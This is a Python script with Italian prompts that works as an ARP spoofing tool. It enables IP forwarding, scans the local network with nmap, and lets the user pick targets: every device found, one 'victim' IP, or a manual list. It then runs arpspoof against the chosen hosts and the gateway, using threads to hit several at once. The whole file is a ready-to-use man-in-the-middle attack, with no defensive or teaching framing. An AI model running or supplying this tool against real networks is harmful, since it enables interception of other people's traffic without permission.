#!/usr/bin/env python3

import os
import re
import subprocess
import socket
from concurrent.futures import ThreadPoolExecutor

def is_valid_ip(ip):
    pattern = r"^(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$"
    return re.match(pattern, ip) is not None

def interfaccia_valida(nome):
    try:
        result = subprocess.run(["ip", "link", "show"], stdout=subprocess.PIPE, text=True)
        return nome + ":" in result.stdout or f"{nome}@" in result.stdout or f"{nome}:" in result.stdout
    except:
        return False

def get_network_range():
    try:
        result = subprocess.run(['ip', '-o', '-f', 'inet', 'addr', 'show'], stdout=subprocess.PIPE, text=True)
        interfaces = result.stdout.splitlines()
        for interface in interfaces:
            if "scope global" in interface:
                ip_range = interface.split()[3]
                return ip_range
    except Exception as e:
        return f"Errore: {e}"

def scan(network_range):
    print("Scansione in corso...")
    try:
        command = [
            "nmap", "-sn",
            "--host-timeout=5m",
            "--scan-delay=1s",
            "--max-retries=10",
            network_range
        ]
        result = subprocess.run(command, capture_output=True, text=True, check=True)
        devices = []
        lines = result.stdout.splitlines()
        current_ip = None
        current_device = None
        hostname = "Unknown"

        for line in lines:
            if "Nmap scan report for" in line:
                parts = line.split("for")[1].strip()
                if "(" in parts and ")" in parts:
                    hostname = parts.split("(")[0].strip()
                    current_ip = parts.split("(")[1].replace(")", "").strip()
                else:
                    hostname = "Unknown"
                    current_ip = parts.strip()

            elif "MAC Address" in line:
                parts = line.split()
                mac_address = parts[2]
                vendor = " ".join(parts[3:]) if len(parts) > 3 else "Unknown Vendor"
                current_device = {
                    "ip": current_ip,
                    "mac": mac_address,
                    "device": vendor,
                    "hostname": hostname
                }
                devices.append(current_device)

        return devices

    except subprocess.CalledProcessError as e:
        print(f"Errore durante l'esecuzione di nmap: {e}")
        return []

def get_inet_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return f"inet {ip}"
    except Exception as e:
        return f"Errore nel determinare inet: {e}"

def enable_ip_forwarding():
    try:
        with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
            f.write("1")
        print("IP forwarding abilitato.")
    except Exception as e:
        print(f"Errore nell'abilitare l'IP forwarding: {e}")

def get_gateway_ip():
    try:
        result = subprocess.run(["ip", "route"], stdout=subprocess.PIPE, text=True)
        for line in result.stdout.splitlines():
            if "default via" in line:
                return line.split()[2]
    except Exception as e:
        print(f"Errore nell'ottenere l'IP del gateway: {e}")
        return None

def multi_thread_arpspoof(ip_list, interfaccia):
    print("Avvio ARP spoofing simultaneo...")
    with ThreadPoolExecutor(max_workers=len(ip_list)) as executor:
        executor.map(lambda ip: execute_arpspoof(ip, interfaccia), ip_list)

def execute_arpspoof(ip, interfaccia):
    try:
        gateway_ip = get_gateway_ip()
        if not gateway_ip:
            print(f"Impossibile determinare il gateway IP. Salto il dispositivo {ip}.")
            return
        print(f"Inizio ARP spoofing per: {ip}")
        subprocess.run(
            ["sudo", "arpspoof", "-i", interfaccia, "-t", ip, "-r", gateway_ip],
            check=True
        )
        print(f"Comando arpspoof completato per {ip}")
    except subprocess.CalledProcessError as e:
        print(f"Errore durante arpspoof per {ip}: {e}")
    except Exception as e:
        print(f"Errore generico durante arpspoof per {ip}: {e}")

if __name__ == '__main__':
    interfaccia = input("Inserisci il nome dell'interfaccia di rete (es. wlan0, eth0): ").strip()
    if not interfaccia_valida(interfaccia):
        print(f"Interfaccia {interfaccia} non trovata sul sistema. Uscita.")
        exit()

    if not 'SUDO_UID' in os.environ.keys():
        print("Esegui il programma con sudo!")
        exit()

    enable_ip_forwarding()
    network_range = get_network_range()

    scelta = ""
    devices = []
    while scelta != "n":
        devices = scan(network_range)
        print("Dispositivi trovati in rete:")
        for device in devices:
            print(f"IP: {device['ip']} - HOST: {device['hostname']} - MAC: {device['mac']} - DEVICE: {device['device']}")
        print("Vuoi ripetere la scansione? (s/n)")
        scelta = input().lower()

    scelta = -1
    while scelta not in [1, 2, 3]:
        subprocess.call('clear', shell=True)
        print(r"          _____  _____   _____                    __ _              ")
        print(r"    /\   |  __ \|  __ \ / ____|                  / _(_)             ")
        print(r"   /  \  | |__) | |__) | (___  _ __   ___   ___ | |_ _ _ __   __ _  ")
        print(r"  / /\ \ |  _  /|  ___/ \___ \| '_ \ / _ \ / _ \|  _| | '_ \ / _` | ")
        print(r" / ____ \| | \ \| |     ____) | |_) | (_) | (_) | | | | | | | (_| | ")
        print(r"/_/    \_\_|  \_\_|    |_____/| .__/ \___/ \___/|_| |_|_| |_|\__, | ")
        print(r"                              | |                             __/ | ")
        print(r"                              |_|                            |___/  ")
        print(r" _____       _               _           _____                      ")
        print(r" |  __ \     | |             | |         / ____|                     ")
        print(r" | |__) |___ | |__   ___ _ __| |_ ___   | |     __ _ _ __   ___      ")
        print(r" |  _  // _ \| '_ \ / _ \ '__| __/ _ \  | |    / _` | '_ \ / _ \     ")
        print(r" | | \ \ (_) | |_) |  __/ |  | || (_) | | |___| (_| | |_) | (_) |    ")
        print(r" |_|  \_\___/|_.__/ \___|_|   \__\___/   \_____\__,_| .__/ \___/     ")
        print(r"                                                     | |              ")
  
        print("1. Attacca tutti i device trovati")
        print("2. Attacca un device")
        print("3. Inserisci manualmente gli indirizzi da attaccare")
        try:
            scelta = int(input("Scelta: "))
        except ValueError:
            continue

    if scelta == 1:
        ip_list = [device['ip'].strip().replace("(", "").replace(")", "") for device in devices]
        multi_thread_arpspoof(ip_list, interfaccia)
    elif scelta == 2:
        print("Dispositivi trovati in rete:")
        for device in devices:
            print(f"IP: {device['ip']} - HOST: {device['hostname']} - MAC: {device['mac']} - DEVICE: {device['device']}")

        ipVittima = input("Inserisci l'indirizzo della vittima: ")

        while not is_valid_ip(ipVittima):
            print("Indirizzo IP non valido. Riprova.")
            ipVittima = input("Inserisci il secondo indirizzo IP: ")

        execute_arpspoof(ipVittima, interfaccia)
    elif scelta == 3:
        listaIp = []

        print("Dispositivi trovati in rete:")
        for device in devices:
            print(f"IP: {device['ip']} - HOST: {device['hostname']} - MAC: {device['mac']} - DEVICE: {device['device']}")

        while True:
            ip = input("Inserisci un indirizzo IP (o 'n' per terminare): ")
            if ip == "n":
                break
            if is_valid_ip(ip):
                listaIp.append(ip)
            else:
                print("Indirizzo IP non valido. Riprova.")

        multi_thread_arpspoof(listaIp, interfaccia)
